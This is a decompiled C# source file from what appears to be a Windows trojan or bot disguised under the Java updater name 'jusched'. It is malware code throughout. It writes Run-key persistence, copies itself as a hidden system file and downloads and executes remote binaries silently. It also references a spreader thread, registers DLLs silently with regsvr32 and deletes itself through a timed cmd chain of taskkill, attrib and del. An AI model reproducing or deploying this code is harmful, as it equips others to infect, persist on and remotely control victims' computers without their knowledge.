using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace jusched;

[StandardModule]
internal sealed class global_0
{
	public static void reg(string regkey, string regname, string regvalue)
	{
		object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey(regkey, writable: true)!.GetValue(regname));
		try
		{
			if (objectValue == null)
			{
				Registry.CurrentUser.OpenSubKey(regkey, writable: true)!.SetValue(regname, regvalue);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void copynhide(string current, string dest)
	{
		try
		{
			if (File.Exists(dest))
			{
				File.SetAttributes(dest, FileAttributes.Normal);
				File.Delete(dest);
			}
			File.Copy(current, dest, overwrite: true);
			File.SetAttributes(dest, FileAttributes.Hidden | FileAttributes.System);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void webget(string uri)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(uri);
			webRequest.Proxy = null;
			webRequest.GetResponse().GetResponseStream();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void updaterkill()
	{
		try
		{
			take.down.uOiXCHFkkjFociRWPEHsfPE();
			Spreaders.spread_0.Abort();
			string path = Environment.GetEnvironmentVariable("windir") + "\\Tasks\\JavaUpdater.job";
			if (File.Exists(path))
			{
				File.SetAttributes(path, (FileAttributes)0);
				File.Delete(path);
			}
			Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + Configuration.regname, throwOnMissingSubKey: true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		string[] processFiles = Configuration.ProcessFiles;
		foreach (string path2 in processFiles)
		{
			try
			{
				if (File.Exists(path2))
				{
					File.Delete(path2);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Install.appMutex.Close();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static object mel()
	{
		string fileName = Environment.GetEnvironmentVariable("APPDATA") + "\\" + Configuration.exename;
		string[] processFiles = Configuration.ProcessFiles;
		for (int i = 0; i < processFiles.Length; i = checked(i + 1))
		{
			try
			{
				Process.Start(fileName);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		object result = default(object);
		try
		{
			Install.appMutex.Close();
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static bool HasInternetConnection(ref string url)
	{
		Uri requestUri = new Uri(url);
		WebRequest webRequest = WebRequest.Create(requestUri);
		try
		{
			WebResponse response = webRequest.GetResponse();
			response.Close();
			webRequest = null;
			response.Close();
			webRequest = null;
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void DownloadAndExecuteUpdate(string Filename)
	{
		updaterkill();
		if (Conversions.ToBoolean(DownloadAndRun(Filename)))
		{
			Process.Start(Process.GetCurrentProcess().MainModule!.FileName);
		}
		Environment.Exit(0);
	}

	public static void wipe()
	{
		string path = Environment.GetEnvironmentVariable("windir") + "\\Tasks\\JavaUpdater.job";
		if (File.Exists(path))
		{
			File.SetAttributes(path, (FileAttributes)0);
			File.Delete(path);
		}
		try
		{
			Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + Configuration.regname, throwOnMissingSubKey: true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		string executablePath = Application.get_ExecutablePath();
		Process currentProcess = Process.GetCurrentProcess();
		Interaction.Shell("cmd.exe /c \"ping -n 30 127.0.0.1 >nul && taskkill /F /IM \"" + currentProcess.ProcessName + ".exe\" && ping -n 10 127.0.0.1 >nul && attrib -s -h -r \"" + executablePath + "\" && ping -n 15 127.0.0.1 >nul && del \"" + executablePath + "\"\"", (AppWinStyle)0, false, -1);
	}

	public static object DownloadAndRun(string exeUrl)
	{
		using WebClient webClient = new WebClient();
		webClient.Proxy = null;
		byte[] bytes = webClient.DownloadData(exeUrl);
		string text = Path.GetTempFileName() + RandomString(6) + ".exe";
		File.WriteAllBytes(text, bytes);
		Process.Start(text);
		object result = default(object);
		return result;
	}

	private static string RandomString(int Length)
	{
		Random random = new Random();
		string text = "abdcdefghijklmnopqrstuvwxyz123456789";
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < Length; i = checked(i + 1))
		{
			stringBuilder.Append(text.Substring(random.Next(0, text.Length), 1));
		}
		return stringBuilder.ToString();
	}

	public static void Registar_Dlls(string filePath)
	{
		try
		{
			string arguments = "/s \"" + filePath + "\"";
			Process process = new Process();
			process.StartInfo.FileName = "regsvr32.exe";
			process.StartInfo.Arguments = arguments;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			process.WaitForExit();
			process.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static bool IsProcessRunning(string name)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		while (true)
		{
			if (num < processes.Length)
			{
				Process process = processes[num];
				if (process.ProcessName.StartsWith(name))
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return false;
		}
		return true;
	}
}
